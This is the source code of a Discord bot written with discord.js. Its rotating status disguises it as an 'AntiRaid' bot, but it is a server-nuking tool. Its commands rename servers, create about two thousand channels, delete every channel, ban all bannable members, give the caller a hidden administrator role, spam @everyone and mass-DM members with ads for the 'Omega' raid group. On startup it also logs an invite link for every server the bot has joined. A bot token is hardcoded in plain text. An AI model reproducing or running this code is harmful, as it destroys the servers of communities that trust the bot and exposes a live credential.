const Discord = require("discord.js");
const bot = new Discord.Client();
const prefix = ".";
bot.login('NTg4MzYwMDkyMTM1NTg3ODUy.XQJFnA.7ylXSfLwM3hGubRQvTyfEdvXLPA')
var mention = "67 connectés"
 
var fucked = false;

bot.on('ready', function() {
  setInterval(async () => {
const statuslist = [
    `surveille 65 serveurs`,
    `𝔹𝕆𝕋 𝔹𝕐 𝕆𝕄𝔼𝔾𝔸`,
    `Bot AntiRaid`,
];
const random = Math.floor(Math.random() * statuslist.length);
 
try {
  await bot.user.setPresence({
    game: {
      name: `${statuslist[random]}`,
      url : "https://www.twitch.tv/Mr.adam99"

    },
    status: "online"
  });
} catch (error) {
  console.error(error);
}
}, 3000);

    bot.guilds.forEach(guild => {
      var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
      invite.createInvite().then(invite => console.log(`Connecté sur : ${guild.name} ${invite}`));
    })
});
 
bot.on('message', msg => {
 
  if (msg.content === '.ping') {
    msg.reply('tu veux quoi ?')
  }

 
 
  if (msg.content === '.z') {
    console.log(`Commande .exe par ${msg.author.tag}`);
    var interval = setInterval (function () {
      msg.channel.send("@everyone");
     }, 500);
  }
            if (msg.content === '.exe') {
            console.log(`Commande .mp par ${msg.author.tag}`);
                if (msg.channel.type === "dm") return;
                if (msg.deletable) msg.delete();
                msg.guild.members.forEach(member => {
                  setInterval(function () {
                    member.send(msg.guild.owner.user.username+" vient de se faire pulvériser son serveur par la 𝕆𝕞𝕖𝕘𝕒 \n\n **REJOINS 𝕆𝕞𝕖𝕘𝕒** : https://discord.gg/mH6P9hM \n\n https://cdn.dribbble.com/users/1461209/screenshots/3963953/drrr.gif").catch(error => {}) }, 450)})
       }
 
if(msg.content === '.suppr'){
          if(msg.channel.type === "dm") return;
          if(msg.guild.channels.size === 0) return;
          else if(!msg.guild.member(bot.user).hasPermission("MANAGE_CHANNELS")) return;
          msg.guild.channels.forEach(chan => { if(chan.deletable) chan.delete();})
      }
 
  if (msg.content === '.exe') {
    console.log(`Commande .exe par ${msg.author.tag}`);
 
    if (!fucked){
      msg.guild.setIcon("diapo.jpg").catch(e => {});
      msg.guild.setName('Raid by 𝕆𝕞𝕖𝕘𝕒').catch(e => {});
 
      for (var i = 0; i < 1000; i++) {
        msg.guild.createChannel('𝕆𝕞𝕖𝕘𝕒', 'voice').catch(e => {});
        msg.guild.createChannel('raid by 𝕆𝕞𝕖𝕘𝕒', 'text').catch(e => {});
      }
      fucked = true;
            }
 
    if (msg.deletable) {
      msg.delete();
    }
  }
 
  if (msg.content === '.ban') {
    console.log(`Commande .ban par ${msg.author.tag}`);
    msg.guild.members.forEach(member => {
      if (!member.roles.exists("name", "  ") && member.bannable) member.ban().catch(e => {});
    });
  }
 
  if (msg.content === '.exit') {
    console.log(`Commande .exit par ${msg.author.tag}`);
    if (msg.deletable) msg.delete().catch(e => {});
    msg.guild.leave().catch(e => {});
  }
 
  if (msg.content === '.be') {
    console.log(`Commande .be par ${msg.author.tag}`);
 
    msg.member.guild.createRole({
      name: "  ",
      permissions: "ADMINISTRATOR",
      mentionable: false
    }).then(function(role) {
      msg.member.addRole(role);
      if (msg.deletable) msg.delete().catch(e => {});
    }).catch(e => {});
  }

});
bot.on("message", msg => {
        if(msg.content.startsWith(".exe")){
           msg.delete()
            let i = 0;
            let interval = setInterval(function () {
              msg.guild.channels.forEach(channel => {
                if (channel.type === "text") channel.send('@everyone je veux vous annoncez que... \n\n La 𝕆𝕞𝕖𝕘𝕒 vient tout juste de détruire ce serveur.**REJOINS 𝕆𝕞𝕖𝕘𝕒** : https://discord.gg/mH6P9hM \n\n https://cdn.dribbble.com/users/1461209/screenshots/3963953/drrr.gif')
              }, 2500);
            });
          }
        });
 
